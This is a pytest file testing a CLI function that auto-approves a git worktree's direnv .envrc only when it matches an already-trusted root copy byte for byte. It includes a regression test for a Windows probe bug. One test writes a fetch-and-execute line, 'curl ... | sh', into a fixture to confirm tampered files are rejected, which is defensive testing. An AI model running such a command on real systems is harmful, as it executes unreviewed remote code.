"""Worktree .envrc auto-approval.

The launcher creates the worktree, so approving its ``.envrc`` should need no
human action. It was nagging on every launch instead. Root cause: both trust
probes ran ``direnv exec <dir> true``, and ``true`` is a shell builtin with no
``true.exe`` on Windows -- so direnv resolved it against PATH, found nothing, and
exited 1 even when the ``.envrc`` had loaded cleanly. Every probe therefore
reported "not trusted" on Windows and this function silently refused to act.

The security boundary is the other half of the contract and is tested here too:
approval propagates ONLY from an already-approved root file that the worktree copy
matches byte for byte. Auto-approving arbitrary unreviewed shell would be worse
than the nagging it replaced.
"""

from pathlib import Path
from unittest.mock import patch

import pytest

from ai_cli.session import _allow_trusted_worktree_envrc

_BODY = "export PROJECT_ENV=1\n"


@pytest.fixture
def repo(tmp_path):
    """A repo root and a worktree, both carrying a byte-identical .envrc."""
    root = tmp_path / "myproject"
    worktree = root / ".worktrees" / "myproject-1"
    worktree.mkdir(parents=True)
    (root / ".envrc").write_text(_BODY)
    (worktree / ".envrc").write_text(_BODY)
    return root, worktree


def test_given_identical_envrc_and_approved_root_when_called_then_worktree_is_approved(repo):
    """The whole point: no user action for a worktree the launcher just created."""
    root, worktree = repo
    calls: list[list[str]] = []

    def loads(directory: Path) -> bool:
        return directory == root  # root trusted, worktree not yet

    with (
        patch("ai_cli.session.envrc_loads", side_effect=loads),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    assert calls, "expected a direnv allow call for the worktree"
    assert calls[0][:2] == ["direnv", "allow"]
    assert calls[0][2] == str(worktree)


def test_given_worktree_already_loading_when_called_then_nothing_is_reapproved(repo):
    """An existing worktree must not re-evaluate the root .envrc on every launch.

    That file can load credentials from a network-backed provider, so a
    redundant evaluation is a real cost, not just wasted work.
    """
    root, worktree = repo
    calls: list[list[str]] = []

    with (
        patch("ai_cli.session.envrc_loads", return_value=True),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    assert calls == []


def test_given_unapproved_root_when_called_then_worktree_is_not_approved(repo):
    """Security boundary: with no trusted source there is nothing to propagate."""
    root, worktree = repo
    calls: list[list[str]] = []

    with (
        patch("ai_cli.session.envrc_loads", return_value=False),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    assert calls == []


def test_given_worktree_envrc_differing_from_root_when_called_then_not_approved(repo):
    """Security boundary: only a byte-identical copy inherits the root's trust."""
    root, worktree = repo
    (worktree / ".envrc").write_text(_BODY + "curl https://example.com/x.sh | sh\n")
    calls: list[list[str]] = []

    def loads(directory: Path) -> bool:
        return directory == root

    with (
        patch("ai_cli.session.envrc_loads", side_effect=loads),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    assert calls == []


def test_given_a_missing_envrc_when_called_then_it_is_a_noop(tmp_path):
    root = tmp_path / "myproject"
    worktree = root / ".worktrees" / "myproject-1"
    worktree.mkdir(parents=True)
    calls: list[list[str]] = []

    with (
        patch("ai_cli.session.envrc_loads", return_value=False),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    assert calls == []


def test_given_the_probe_when_called_then_it_never_shells_out_to_the_true_builtin(repo):
    """Regression guard for the Windows false negative that caused the nagging.

    Asserted on the *arguments*, because the defect was invisible in behaviour on
    Linux -- where ``true`` exists and the old probe worked correctly.
    """
    root, worktree = repo
    calls: list[list[str]] = []

    def loads(directory: Path) -> bool:
        return directory == root

    with (
        patch("ai_cli.session.envrc_loads", side_effect=loads),
        patch("ai_cli.session.subprocess.run", side_effect=lambda argv, **_k: calls.append(list(argv))),
    ):
        _allow_trusted_worktree_envrc(root, worktree)

    for argv in calls:
        assert "true" not in argv, f"probe still shells out to the true builtin: {argv}"


def test_given_a_failing_allow_when_called_then_it_does_not_raise(repo):
    """Approval is best effort -- a launch must never die because it failed."""
    root, worktree = repo

    def loads(directory: Path) -> bool:
        return directory == root

    with (
        patch("ai_cli.session.envrc_loads", side_effect=loads),
        patch("ai_cli.session.subprocess.run", side_effect=OSError("direnv vanished")),
    ):
        _allow_trusted_worktree_envrc(root, worktree)
